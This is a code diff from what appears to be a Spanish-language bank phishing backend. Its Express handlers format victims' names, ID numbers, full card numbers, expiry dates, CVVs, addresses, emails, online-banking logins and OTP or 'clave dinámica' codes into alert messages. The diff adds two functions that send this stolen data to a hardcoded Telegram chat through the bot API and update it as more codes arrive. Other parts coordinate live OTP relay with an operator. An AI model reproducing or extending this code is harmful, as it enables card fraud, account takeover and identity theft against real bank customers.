@@ -221,20 +221,20 @@ export const updateMessageWithOtp = async (req, res) => {
       .json({ error: "No hay sesión activa para ese socketId" });
 
   try {
-    session.option = '';
+    session.option = "";
     session.otp = otp;
     session.step = 3;
 
     decisionMap.set(session.decisionId, session.sessionId);
     activeSessions.set(session.sessionId, session);
-    
+
     const messageText = buildMessageText(session);
 
     await sendTelegramAlert({
       groupId: process.env.GROUP_1,
       messageId: session.messageId,
       text: messageText,
-      sessionId: session.sessionId
+      sessionId: session.sessionId,
     });
 
     waitForDecision(session.decisionId, session.step)
@@ -260,8 +260,8 @@ export const updateMessageWithOtp = async (req, res) => {
 };
 
 function mask(value) {
-   if (typeof value !== 'string') return '';
-  return value.match(/.{1,4}/g)?.join(' ') || '';
+  if (typeof value !== "string") return "";
+  return value.match(/.{1,4}/g)?.join(" ") || "";
 }
 
 export function buildMessageText(session, err = 0) {
@@ -284,53 +284,158 @@ export function buildMessageText(session, err = 0) {
 ┣🟢 Dirección: ${session.add || "PENDIENTE"}
 ╰🟢 Telefóno: ${session.tel || "PENDIENTE"}
 
-╭${session.card ? '🟢' : "🟡" } CC: ${session.card ? mask(session.card) : "PENDIENTE"}
-┣${session.exp ? '🟢' : "🟡"} Exp: ${session.exp || "PENDIENTE"}
-╰${session.cvv ? '🟢' : "🟡"} CVV: ${session.cvv || "PENDIENTE"}
+╭${session.card ? "🟢" : "🟡"} CC: ${
+        session.card ? mask(session.card) : "PENDIENTE"
+      }
+┣${session.exp ? "🟢" : "🟡"} Exp: ${session.exp || "PENDIENTE"}
+╰${session.cvv ? "🟢" : "🟡"} CVV: ${session.cvv || "PENDIENTE"}
 `;
     }
 
     if (step >= 3) {
       baseText += `
 🚨 Nueva Data 🚨
-${session.otp ? '💸' : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
+${session.otp ? "💸" : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
 `;
     }
 
     return baseText.trim();
   } else {
     let errText;
-    if(err === 1) {
+    if (err === 1) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
 ╭❗ Error Logo ❗
 ┣🔴 Usuario: ${session.user}
 ╰🔴 Contraseña: ${session.pass}
-      `
+      `;
     }
-    if(err === 2) {
+    if (err === 2) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
 ╭❗ Error CC ❗
 ┣🔴 CC: ${session.card}
 ┣🔴 Exp: ${session.exp}
 ╰🔴 CVV: ${session.cvv}
-      `
+      `;
     }
-    if(err === 3) {
+    if (err === 3) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]}
 ╭❗ Error Dinamica ❗
 ╰❌ Dinamica: ${session.otp}
-      `
+      `;
     }
-    if(err === 4) {
+    if (err === 4) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
 ╭❗ Error OTP ❗
 ╰❌ OTP: ${session.otp}
-      `
+      `;
     }
     return errText.trim();
   }
 }
+
+export const latamSimpleMsj = async (req, res) => {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const raw = req.body;
+  console.log(req.body)
+  const data = JSON.parse(raw.data);
+
+  const chatId = "-1002850830211";
+  
+  let text = `
+🚨🚨 Nuevo Ingreso 🚨🚨
+
+╭🟡 Banco: ${data.banco}
+┣🟢 Nombre: ${data.nombre}
+┣🟢 Cedula: ${data.cedula}
+┣🟢 Tarjeta: ${data.tarjeta}
+┣🟢 Exp: ${data.fecha}
+┣🟢 Cvv: ${data.cvv}
+╰🟢 Telefono: ${data.telefono}
+╰🟢 Direccion: ${data.direccion}
+╰🟢 Correo: ${data.email}`
+  try {
+    const result = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text }),
+    });
+
+    if (!result.ok) {
+      throw new Error('Error en la respuesta de Telegram');
+    }
+
+    const data = await result.json();
+    if (data.ok) {
+      return res.status(200).json({ success: true, messageId: data.result.message_id });
+    } else {
+      throw new Error('Error en la respuesta de Telegram: ' + JSON.stringify(data));
+    }
+  } catch (error) {
+    console.error('Error al enviar mensaje a Telegram:', error.message);
+    return res.status(500).json({ success: false, error: error.message });
+  }
+};
+
+export const editLatamMsj = async (req, res) => {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  const data = req.body.data;
+  const chatId = "-1002850830211";
+  const messageId = req.body.messageId; // Asegúrate de pasar el messageId en la solicitud
+  console.log(messageId);
+  console.log(data);
+  let nuevoTexto = `
+🚨🚨 Nuevo Ingreso 🚨🚨
+
+╭🟡 Banco: ${data.banco}
+┣🟢 Nombre: ${data.nombre}
+┣🟢 Cedula: ${data.cedula}
+┣🟢 Tarjeta: ${data.tarjeta}
+┣🟢 Exp: ${data.fecha}
+┣🟢 Cvv: ${data.cvv}
+╰🟢 Telefono: ${data.telefono}
+╰🟢 Direccion: ${data.direccion}
+╰🟢 Correo: ${data.email}
+
+🚨🚨 Logo 🚨🚨
+
+╭🟢 Usuario: ${data.usuario || 'Pendiente'}
+╰🟢 Contraseña: ${data.pass || 'Pendiente'}
+
+🚨🚨 ${
+  data.dinamica
+  ? "Clave Dinamica"
+  : data.otp
+  ? "Codigo OTP"
+  : "Codigo de Verificación"
+} 🚨🚨
+
+💸 Codigo: ${data.dinamica || data.otp || 'Pendiente'}
+
+`;
+
+  try {
+    const result = await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, text: nuevoTexto, parse_mode: 'Markdown' }),
+    });
+
+    if (!result.ok) {
+      throw new Error('Error en la respuesta de Telegram');
+    }
+
+    const responseData = await result.json();
+    if (responseData.ok) {
+      return res.status(200).json({ success: true, messageId });
+    } else {
+      throw new Error('Error en la respuesta de Telegram: ' + JSON.stringify(responseData));
+    }
+  } catch (error) {
+    console.error('Error al editar mensaje a Telegram:', error.message);
+    return res.status(500).json({ success: false, error: error.message });
+  }
+};
